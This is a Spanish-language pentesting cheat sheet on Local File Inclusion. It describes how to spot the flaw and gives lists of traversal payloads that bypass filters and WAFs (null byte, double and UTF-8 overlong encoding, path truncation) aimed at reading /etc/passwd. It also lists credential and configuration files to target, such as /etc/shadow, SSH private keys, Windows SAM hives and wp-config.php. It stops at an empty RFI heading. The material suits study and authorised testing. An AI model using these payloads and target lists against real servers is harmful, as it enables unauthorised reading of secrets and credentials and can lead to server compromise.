# LFI

### Indentificacion de vulnerabilidades LFI:

- Uso excesivo de rutas relativas: Si la URL permite que el usuario especifique rutas relativas, como "../../archivo_secreto"
  
- Parámetros que parecen nombres de archivos: Si los parámetros en la URL parecen nombres de archivos, como "archivo=nombre_de_archivo"

- Rutas de archivos completas: Si la URL muestra rutas de archivos completas, como "C:\ruta\al\archivo", esto podría ser una indicación de una LFI, especialmente en sistemas Windows.

### Explotacion
La explotación de estas vulnerabilidades depende del lenguaje de programación en el que este escrita la aplicación y la configuración del servidor. En el caso de PHP, la versión del tiempo de ejecución del lenguaje y configuraciones del servidor web, específicamente valores de php.ini como `register_globals` y `allow_url wrappers`, marcan una diferencia considerable en la forma en que se pueden explotar estas vulnerabilidades.

A la hora de explotar un LFI buscamos:
1. Recolectar informacion de archivos sensibles
   - Archivos de configuracion de la aplicacion web
     - Exploits publicos
     - Repositorio de Github de la aplicacion
     - Google
   - Archivos del sistema
2. Conseguir ejecucion de codigo en el servidor

#### Bypass de filtros/WAF

````bash

# Null byte
http://example.com/index.php?page=../../../etc/passwd%00

Doble encoding
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00

# UTF-8 encoding
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00

# Path and dot truncation

http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd

Otros bypass
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
````

#### Archivos comunes

El proceso de inclusion de archivos podemos realizarlo de manera manual buscando archivos comunes del sistema o mediante fuerza bruta.

Archivos de sistema 

````
LINUX
/etc/passwd
/etc/shadow
/etc/issue
/etc/crontab
/home/user/.ssh/id_rsa
/etc/knockd.conf

WINDOWS
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/SYSTEM
````
|LINUX                  | WINDOWS                  |
|:---------------------:|:-------------------------:|
|/etc/passwd|C:/Windows/system32/config/regback/sam|
|/etc/shadow|C:/Windows/system32/config/regback/SYSTEM|
|/etc/issue||
|/etc/crontab||
|/home/user/.ssh/id_rsa||
|/etc/knockd.conf||
Archivos de aplicacion
````
# Tomcat
/etc/tomcat7/tomcat-users.xml

# Apache
/var/log/httpd-access.log   # Linux logs
C:\xampp\apache\logs\access.log # Windows logs
/etc/apache2/sites-enabled/000-default.conf  # Configuracion

# Filezilla
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml

# phpMyAdmin
/etc/phpmyadmin/config-db.php

# Wordpress
/var/www/html/wp-config.php

# Redis
/etc/redis/redis.conf
/etc/systemd/system/redis.service

# XAMPP
xampp/apache/conf/http.conf
/security/webdav.htpasswd
index.php

# FreeBSD
/usr/local/etc/apache22/httpd.conf

````
# RFI
